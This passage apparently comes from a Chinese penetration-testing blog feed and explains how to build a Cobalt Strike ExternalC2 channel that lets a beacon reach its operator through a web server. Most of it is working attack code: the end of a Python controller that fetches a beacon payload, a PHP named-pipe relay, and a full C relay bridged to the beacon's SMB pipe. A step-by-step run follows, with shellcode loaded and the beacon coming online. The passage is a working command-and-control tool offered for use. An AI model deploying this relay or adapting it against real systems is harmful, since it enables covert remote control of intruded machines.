请求payload</span></span><br><span class="line">    payloaddata = requestpayload(soc, <span class="string">"x64"</span>, <span class="string">"rcoil"</span>, <span class="number">1000</span>)</span><br><span class="line">    paylaodfile = droppaylod(payloaddata)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"paylaod文件名为： "</span> + paylaodfile)</span><br><span class="line">    print(<span class="string">"请使用loader在被控端执行payload"</span>)</span><br><span class="line">    r = requests.session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        url = input(<span class="string">"请输入第三方客户端地址："</span>)</span><br><span class="line">        res = r.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> res.text == <span class="string">'OK'</span>:</span><br><span class="line">            print(<span class="string">"第三方客户端有问题，请查看。"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    ctrl_loop(soc, r, url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="4-2、Client–Web"><a href="#4-2、Client–Web" class="headerlink" title="4.2、Client–Web"></a>4.2、Client–Web</h3><p>等待 Controller 连接，往下就是对脚本的轮询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/client/php/piperw.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readpipe</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    $name=<span class="string">"\\\\.\\pipe\\"</span>.$name;</span><br><span class="line">    $fp=fopen($name,<span class="string">"rb"</span>);</span><br><span class="line">    <span class="comment">//分两次读</span></span><br><span class="line">    $len=fread($fp,<span class="number">4</span>);</span><br><span class="line">    $len=unpack(<span class="string">"v"</span>,$len)[<span class="number">1</span>];</span><br><span class="line">    $data=fread($fp,$len);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writepipe</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    $name=<span class="string">"\\\\.\\pipe\\"</span>.$name;</span><br><span class="line">    $fp=fopen($name,<span class="string">"wb"</span>);</span><br><span class="line">    $data=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">    <span class="comment">//一次性写</span></span><br><span class="line">    fwrite($fp,$data);</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    <span class="comment">//根据请求参数进行不同的操作</span></span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'action'</span>]==<span class="string">'read'</span>)&#123;</span><br><span class="line">        readpipe(<span class="string">"readrcoil"</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span> ($_GET[<span class="string">'action'</span>]==<span class="string">'write'</span>)&#123;</span><br><span class="line">        writepipe(<span class="string">"writercoil"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//脚本执行成功</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"OK"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3、Client-EXE"><a href="#4-3、Client-EXE" class="headerlink" title="4.3、Client-EXE"></a>4.3、Client-EXE</h3><p>这个客户端也相当与一个中转</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/client/c/webc2_loader/PipeOperationRelay/%E6%BA%90.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAYLOAD_MAX_SIZE 512 * 1024</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_MAX_SIZE 1024 * 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//桥，字面意思。方便把自定义的管道和beacon管道桥接的结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">HANDLE client;</span><br><span class="line">HANDLE server;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从beacon读取数据</span></span><br><span class="line"><span class="function">DWORD <span class="title">read_frame</span><span class="params">(HANDLE my_handle, <span class="keyword">char</span>* buffer, DWORD max)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD size = <span class="number">0</span>, temp = <span class="number">0</span>, total = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* read the 4-byte length */</span></span><br><span class="line">ReadFile(my_handle, (<span class="keyword">char</span>*)&amp; size, <span class="number">4</span>, &amp;temp, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read_frame length: %d\n"</span>, size);</span><br><span class="line"><span class="comment">/* read the whole thing in */</span></span><br><span class="line"><span class="keyword">while</span> (total &lt; size) &#123;</span><br><span class="line">ReadFile(my_handle, buffer + total, size - total, &amp;temp,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line">total += temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向beacon写入数据</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_frame</span><span class="params">(HANDLE my_handle, <span class="keyword">char</span>* buffer, DWORD length)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write_frame length: %d\n"</span>, length);</span><br><span class="line">DWORD wrote = <span class="number">0</span>;</span><br><span class="line">WriteFile(my_handle, (<span class="keyword">void</span>*)&amp; length, <span class="number">4</span>, &amp;wrote, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write %d bytes.\n"</span>, wrote);</span><br><span class="line">WriteFile(my_handle, buffer, length, &amp;wrote, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write %d bytes.\n"</span>, wrote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//从控制器读取数据</span></span><br><span class="line"><span class="function">DWORD <span class="title">read_client</span><span class="params">(HANDLE my_handle, <span class="keyword">char</span>* buffer)</span> </span>&#123;</span><br><span class="line">DWORD size = <span class="number">0</span>;</span><br><span class="line">DWORD readed = <span class="number">0</span>;</span><br><span class="line">ReadFile(my_handle, &amp;size, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read_client length: %d\n"</span>, size);</span><br><span class="line">ReadFile(my_handle, buffer, size, &amp;readed, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"final data from client: %d\n"</span>, readed);</span><br><span class="line"><span class="keyword">return</span> readed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向控制器写入数据</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_client</span><span class="params">(HANDLE my_handle, <span class="keyword">char</span>* buffer, DWORD length)</span> </span>&#123;</span><br><span class="line">DWORD wrote = <span class="number">0</span>;</span><br><span class="line">WriteFile(my_handle, buffer, length, &amp;wrote, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write client total %d data %d\n"</span>, wrote, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端读管道、服务端写管道逻辑</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ReadOnlyPipeProcess</span><span class="params">(LPVOID lpvParam)</span> </span>&#123;</span><br><span class="line"><span class="comment">//把两条管道的句柄取出来</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span>* <span class="title">bridge</span> = (<span class="title">struct</span> <span class="title">BRIDGE</span>*)<span class="title">lpvParam</span>;</span></span><br><span class="line">HANDLE hpipe = bridge-&gt;client;</span><br><span class="line">HANDLE beacon = bridge-&gt;server;</span><br><span class="line"></span><br><span class="line">DWORD length = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* buffer = VirtualAlloc(<span class="number">0</span>, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//再次校验管道</span></span><br><span class="line"><span class="keyword">if</span> ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ConnectNamedPipe(hpipe, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client want read.\n"</span>);</span><br><span class="line">length = read_frame(beacon, buffer, BUFFER_MAX_SIZE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read from beacon: %d\n"</span>, length);</span><br><span class="line"><span class="comment">//分两次传送，发一次长度，再发数据。</span></span><br><span class="line">write_client(hpipe,(<span class="keyword">char</span> *) &amp;length, <span class="number">4</span>);</span><br><span class="line">FlushFileBuffers(hpipe);</span><br><span class="line">write_client(hpipe, buffer, length);</span><br><span class="line">FlushFileBuffers(hpipe);</span><br><span class="line">DisconnectNamedPipe(hpipe);</span><br><span class="line"><span class="comment">//清空缓存区</span></span><br><span class="line">ZeroMemory(buffer, BUFFER_MAX_SIZE);</span><br><span class="line">length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//客户端写管道、服务端读管道逻辑</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WriteOnlyPipeProcess</span><span class="params">(LPVOID lpvParam)</span> </span>&#123;</span><br><span class="line"><span class="comment">//取出两条管道</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span>* <span class="title">bridge</span> = (<span class="title">struct</span> <span class="title">BRIDGE</span>*)<span class="title">lpvParam</span>;</span></span><br><span class="line">HANDLE hpipe = bridge-&gt;client;</span><br><span class="line">HANDLE beacon = bridge-&gt;server;</span><br><span class="line"></span><br><span class="line">DWORD length = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* buffer = VirtualAlloc(<span class="number">0</span>, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ConnectNamedPipe(hpipe, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//一次性读，一次性写</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client want write.\n"</span>);</span><br><span class="line">length = read_client(hpipe, buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read from client: %d\n"</span>, length);</span><br><span class="line">write_frame(beacon, buffer, length);</span><br><span class="line">DisconnectNamedPipe(hpipe);</span><br><span class="line"><span class="comment">//清空缓存区</span></span><br><span class="line">ZeroMemory(buffer, BUFFER_MAX_SIZE);</span><br><span class="line">length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建客户端读管道</span></span><br><span class="line">HANDLE hPipeRead = CreateNamedPipe(<span class="string">"\\\\.\\pipe\\readrcoil"</span>, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//创建客户端写管道</span></span><br><span class="line">HANDLE hPipeWrite = CreateNamedPipe(<span class="string">"\\\\.\\pipe\\writercoil"</span>, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//与beacon建立连接</span></span><br><span class="line">HANDLE hfileServer = CreateFileA(<span class="string">"\\\\.\\pipe\\rcoil"</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//检测管道和连接是否建立成功</span></span><br><span class="line"><span class="keyword">if</span> ((hPipeRead == INVALID_HANDLE_VALUE) || (hPipeWrite == INVALID_HANDLE_VALUE) || (hfileServer == INVALID_HANDLE_VALUE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (hPipeRead == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error during create readpipe."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hPipeWrite == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error during create writepipe."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hfileServer == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error during connect to beacon."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//一切正常</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"all pipes are ok.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//放入客户端读管道和beacon连接</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span> <span class="title">readbridge</span>;</span></span><br><span class="line">readbridge.client = hPipeRead;</span><br><span class="line">readbridge.server = hfileServer;</span><br><span class="line"><span class="comment">//启动客户端读管道逻辑</span></span><br><span class="line">HANDLE hTPipeRead = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ReadOnlyPipeProcess, (LPVOID)&amp; readbridge, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//放入客户端写管道和beacon连接</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BRIDGE</span> <span class="title">writebridge</span>;</span></span><br><span class="line">writebridge.client = hPipeWrite;</span><br><span class="line">writebridge.server = hfileServer;</span><br><span class="line"><span class="comment">//启动客户端写管道逻辑</span></span><br><span class="line">HANDLE hTPipeWrite = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, WriteOnlyPipeProcess, (LPVOID)&amp; writebridge, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//代码没有什么意义，直接写个死循环也行</span></span><br><span class="line">HANDLE waitHandles[] = &#123; hPipeRead,hPipeWrite &#125;;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">WaitForMultipleObjects(<span class="number">2</span>, waitHandles, TRUE, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，自用的会使用 <code>C#</code> 进行重写。</p><h2 id="0x05-实操"><a href="#0x05-实操" class="headerlink" title="0x05 实操"></a>0x05 实操</h2><h3 id="5-1、加载脚本"><a href="#5-1、加载脚本" class="headerlink" title="5.1、加载脚本"></a>5.1、加载脚本</h3><p>加载 <code>ExternalC2.cna</code>，完成第一步。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-10-10_10-24-23.png" alt=""></p><h3 id="5-2、Controller"><a href="#5-2、Controller" class="headerlink" title="5.2、Controller"></a>5.2、Controller</h3><p>这里我们使用的代码是参照 <a href="https://github.com/xpn" target="_blank" rel="noopener">XPN </a>的代码写成与上方 <a href="https://github.com/hl0rey" target="_blank" rel="noopener">hl0rey</a> 一样格式的代码。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-10-10_11-03-43.png" alt=""></p><h3 id="5-3、Client"><a href="#5-3、Client" class="headerlink" title="5.3、Client"></a>5.3、Client</h3><p>使用加载器加载这一段 <code>shellcode</code>，查看 <code>pipelist</code>，可以看到我们自定义的管道名。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/Snipaste_2019-10-10_11-08-30.png" alt=""></p><p>到这里，可以说明 <code>SMB Beacon</code> 已经成功运行，目前缺少的是可与之进行交互的上层进程。往下继续，运行 <code>Client-EXE</code>（使用hl0rey的代码），再次查看 <code>pipelist</code>，结果如下</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/Snipaste_2019-10-10_13-02-01.png" alt=""></p><h3 id="5-4、Cobalt-Strike"><a href="#5-4、Cobalt-Strike" class="headerlink" title="5.4、Cobalt Strike"></a>5.4、Cobalt Strike</h3><p>成功上线。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-10-10_13-06-47.png" alt=""></p><h3 id="5-5、问题"><a href="#5-5、问题" class="headerlink" title="5.5、问题"></a>5.5、问题</h3><p>但是，查看 <code>PipeOption.exe</code>，崩了。同时，<code>Cobalt Strike</code> 上线的机器，心跳包正常，但是功能无法使用。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/Snipaste_2019-10-10_14-48-45.png" alt=""></p><p>应该是 <code>PipeOption.exe</code> 和 <code>php 脚本</code>之间出现的问题，通过抓包，发现这里应该是权限问题。</p><p><img src="/image/【渗透技巧】Cobalt Strike 的 ExternalC2/blog_2019-10-10_15-47-37.png" alt=""></p><p>将 <code>PipeOpiton.exe</code> 以管理员权限运行，<code>action=read</code> 则没出错。</p><p>向 <code>Lz1y</code> 大佬请教了下，还是改改 <code>Client-EXE</code> 和 <code>Client-Web</code> 的代码算了。不使用命名管道，直接读写文件，这样 <code>Client-Web</code> 的不同版本也可以很好写。看到这里是不是很蛋疼，嘤嘤嘤。相关代码后续再补上吧，留个坑！！！</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/" target="_blank" rel="noopener">Exploring Cobalt Strike’s ExternalC2 framework</a><br><a href="https://mp.weixin.qq.com/s/q3QZ41qwFcKaIL7qb6q1fQ" target="_blank" rel="noopener">利用 External C2 解决内网服务器无法出网的问题</a><br><a href="https://www.anquanke.com/post/id/103395" target="_blank" rel="noopener">一起探索Cobalt Strike的ExternalC2框架</a><br><a href="https://www.cobaltstrike.com/downloads/externalc2spec.pdf" target="_blank" rel="noopener">externalc2spec.pdf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Cobalt Strike&lt;/code&gt; 的上线问题归结为以下几点：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;问题&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;解决方法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;目标存在杀软（被杀）&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Shellcode 加载器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;目标存在杀软（拦截连接）&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;C2 处理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;目标机是 Web 映射出网&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;特殊 C2 处理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;隔离网络&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;出网机器做跳板&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;本文针对第 3 点进行展开。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】域内会话收集</title>
    <link href="https://rcoil.me/2019/10/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9F%9F%E5%86%85%E4%BC%9A%E8%AF%9D%E6%94%B6%E9%9B%86/"/>
    <id>https://rcoil.me/2019/10/【域渗透】域内会话收集/</id>
    <published>2019-10-01T03:13:20.000Z</published>
    <updated>2019-11-01T01:48:22.943Z</updated>
    
